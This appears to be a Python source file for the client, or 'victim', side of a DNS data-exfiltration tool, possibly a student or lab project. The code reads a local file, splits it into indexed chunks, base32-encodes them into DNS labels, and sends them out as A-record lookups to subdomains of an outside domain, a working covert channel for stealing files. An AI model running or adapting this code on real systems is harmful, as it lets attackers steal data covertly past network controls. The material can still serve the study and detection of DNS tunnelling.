import base64
import os
from pathlib import Path

import dns.resolver


class Client:
    """
    The Client class deals with the client side (the victim)
    by sending a single file from the victim
    to the server via DNS messages
    """

    def __init__(self, path: str, label_len: int, record_len: int):
        """
        :param path: a path to the file that will send to the server
        :param label_len: the max len between periods
        :param record_len: the total len of one dns record
        """
        self.check_params(path, label_len, record_len)
        self.path = path
        self.message = self.get_message()
        self.label_len = label_len
        self.record_len = record_len
        self.file_name = self.get_file_name()
        self.pkts = self.split_message()

    def encode_to_base32(self, str_):
        b = bytes(str_, 'utf-8')
        mes = base64.b32encode(b)

        b = str(mes, 'utf-8')
        b = '.'.join([b[i:i + self.label_len] for i in range(0, len(b), self.label_len)])
        b = b + '.'

        return b

    def get_message(self):
        with open(self.path, mode="r", encoding="utf-8") as file:
            lines = file.readlines()
            message = "".join(lines)
            return message

    def get_file_name(self):
        file_name = self.path.split('\\')[-1]
        return file_name

    def split_message(self):
        pkts = list()
        pkts.append(self.file_name + f" #FILENAME#")
        for i in range(0, self.message.__len__(), self.record_len):
            pkts.append(self.message[i:min(i + self.record_len, self.message.__len__())] + f" #index {i}#")
        return pkts

    def send_messages(self):
        for i, pkt in enumerate(self.pkts):
            msg = self.encode_to_base32(pkt)
            answers = dns.resolver.query(f'www.{msg}jct.ac.il', 'A')

    @staticmethod
    def check_params(path, label_len, record_len):
        if not os.path.isfile(path):
            raise FileNotFoundError(f'The given path {path} is incorrect')
        if not isinstance(label_len, int):
            raise TypeError(f'the label length must be an integer. you gave {type(label_len)}')
        if not isinstance(record_len, int):
            raise TypeError(f'the record length must be an integer. you gave {type(record_len)}')


if __name__ == '__main__':
    path = str(Path(__file__).parent.parent)+'\\Text.txt'
    tool = Client(path=path, label_len=5, record_len=15)
    tool.send_messages()
